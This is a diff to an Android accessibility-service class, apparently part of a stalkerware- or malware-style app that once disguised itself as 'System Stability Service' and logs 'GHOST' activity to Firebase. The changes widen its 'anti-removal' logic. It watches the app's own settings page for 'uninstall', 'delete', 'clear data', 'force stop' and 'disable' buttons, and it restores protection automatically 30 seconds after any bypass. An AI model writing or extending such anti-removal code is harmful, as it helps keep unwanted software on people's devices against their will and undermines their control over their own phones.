@@ -195,16 +195,15 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     return;
                 }
 
-                // Only trigger if we are specifically on OUR app's details page and see dangerous buttons
-                if (pkg.contains("settings")) {
-                    List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText("System Stability Service");
-                    if (labels == null || labels.isEmpty()) {
-                        root.recycle();
-                        return;
-                    }
+                // Only trigger if we are specifically on OUR app's details page
+                String appName = getString(R.string.app_name);
+                List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText(appName);
+                if (labels == null || labels.isEmpty()) {
+                    root.recycle();
+                    return;
                 }
 
-                String[] danger = {"uninstall", "delete", "clear data"};
+                String[] danger = {"uninstall", "delete", "clear data", "force stop", "disable"};
                 for (String s : danger) {
                     List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
                     if (nodes != null && !nodes.isEmpty()) {
@@ -389,7 +388,11 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     public static boolean isAntiRemovalEnabled() { return !skipAntiRemoval; }
     public static void setAntiRemovalEnabled(boolean enabled) { skipAntiRemoval = !enabled; }
-    public static void forceSkipAntiRemoval() { skipAntiRemoval = true; }
+    public static void forceSkipAntiRemoval() {
+        skipAntiRemoval = true;
+        // Auto-re-enable after 30 seconds of maintenance window
+        new Handler(Looper.getMainLooper()).postDelayed(() -> skipAntiRemoval = false, 30000);
+    }
 
     private static boolean autoPilotEngaged = true;
     public static void setAutoPilot(boolean enabled) { autoPilotEngaged = enabled; }
@@ -689,13 +692,12 @@ public class IO_Persistence_Manager extends AccessibilityService {
     public void runAutoHeal() {
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
-                skipAntiRemoval = true; 
+                forceSkipAntiRemoval();
                 FirebaseConfig.logActivity("GHOST_MAINTENANCE: Self-Healing...");
                 Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                 intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                 startActivity(intent);
-                new Handler(Looper.getMainLooper()).postDelayed(() -> skipAntiRemoval = false, 15000);
             } catch (Exception e) { FirebaseConfig.logActivity("GHOST_ERROR: Auto-Heal failed"); }
         });
     }
